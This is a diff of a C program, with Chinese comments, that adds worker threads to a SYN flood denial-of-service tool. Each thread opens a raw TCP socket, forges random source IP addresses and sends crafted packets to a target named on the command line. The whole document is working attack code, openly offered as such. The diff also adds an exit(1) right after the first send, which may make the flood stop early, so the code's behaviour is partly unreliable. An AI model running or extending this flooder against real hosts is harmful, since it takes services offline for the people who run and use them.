@@ -11,22 +11,30 @@
 #include <netinet/ip.h>
 #include <arpa/inet.h>
 #include <linux/tcp.h>
+#include <pthread.h>
+#include <unistd.h>
+
+typedef struct dos_context_s {
+	int index;
+	struct sockaddr_in target;
+	unsigned short srcport;
+}dos_context_t;
+
 
 //我们自己写的攻击函数
 static void attack(int skfd,struct sockaddr_in *target,unsigned short srcport);
 //如果什么都让内核做，那岂不是忒不爽了，咱也试着计算一下校验和。
 static unsigned short check_sum(unsigned short *addr,int len);
+static void *worker_thread(void *arg);
 
 int main(int argc,char** argv){
-	int skfd;
 	struct sockaddr_in target;
 	struct hostent *host;
-	const int on=1;
-	unsigned short srcport;
+	int i;
 
 	if(argc!=4)
 	{
-		printf("Usage:%s target dstport srcport\n",argv[0]);
+		printf("Usage:%s target dstport workernum\n",argv[0]);
 		exit(1);
 	}
 
@@ -45,26 +53,25 @@ int main(int argc,char** argv){
 		target.sin_addr=*(struct in_addr *)(host->h_addr_list[0]);
 	}
 
-	//将协议字段置为IPPROTO_TCP，来创建一个TCP的原始套接字
-	if(0>(skfd=socket(AF_INET,SOCK_RAW,IPPROTO_TCP))){
-		perror("Create Error");
-		exit(1);
+	printf("target:%s\n", inet_ntoa(target.sin_addr));
+
+	for(i = 0; i < atoi(argv[3]); i++){
+		pthread_t wth;
+		dos_context_t *dc = (dos_context_t*)calloc(1, sizeof(dos_context_t));
+		dc->target = target;
+		dc->srcport = (unsigned short)(random()+1000);
+		dc->index = i;
+
+		pthread_create(&wth, NULL, worker_thread, (void*)dc);
 	}
 
-	//用模板代码来开启IP_HDRINCL特性，我们完全自己手动构造IP报文
-	if(0>setsockopt(skfd,IPPROTO_IP,IP_HDRINCL,&on,sizeof(on))){
-		perror("IP_HDRINCL failed");
-		exit(1);
+	while(1) {
+        sleep(1);
 	}
-
-	//因为只有root用户才可以play with raw socket :)
-	setuid(getpid());
-	srcport = atoi(argv[3]);
-	attack(skfd,&target,srcport);
 }
 
 //在该函数中构造整个IP报文，最后调用sendto函数将报文发送出去
-void attack(int skfd,struct sockaddr_in *target,unsigned short srcport){
+static void attack(int skfd,struct sockaddr_in *target,unsigned short srcport){
 	char buf[128]={0};
 	struct ip *ip;
 	struct tcphdr *tcp;
@@ -99,12 +106,43 @@ void attack(int skfd,struct sockaddr_in *target,unsigned short srcport){
 		//源地址伪造，我们随便任意生成个地址，让服务器一直等待下去
 		ip->ip_src.s_addr = random();
 		tcp->check=check_sum((unsigned short*)tcp,sizeof(struct tcphdr));
-		sendto(skfd,buf,ip_len,0,(struct sockaddr*)target,sizeof(struct sockaddr_in));
+		sendto(skfd, buf, ip_len, 0, (struct sockaddr*)target, sizeof(struct sockaddr_in));
+
+		exit(1);
 	}
 }
 
+
+static void *worker_thread(void *arg)
+{
+	dos_context_t *dc = (dos_context_t*)arg;
+	int skfd;
+	const int on=1;
+	unsigned short srcport;
+
+	printf("Create worker:%d srcport:%d\n", dc->index, dc->srcport);
+
+	//将协议字段置为IPPROTO_TCP，来创建一个TCP的原始套接字
+	if(0 > (skfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP))){
+		perror("Create Error:");
+		exit(1);
+	}
+
+	//用模板代码来开启IP_HDRINCL特性，我们完全自己手动构造IP报文
+	if(0 > setsockopt(skfd, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on))){
+		perror("IP_HDRINCL failed");
+		exit(1);
+	}
+
+
+	srcport = dc->srcport;
+	attack(skfd, &dc->target, srcport);
+
+	return NULL;
+}
+
 //关于CRC校验和的计算，网上一大堆，我就“拿来主义”了
-unsigned short check_sum(unsigned short *addr,int len){
+static unsigned short check_sum(unsigned short *addr,int len){
 	register int nleft=len;
 	register int sum=0;
 	register short *w=addr;
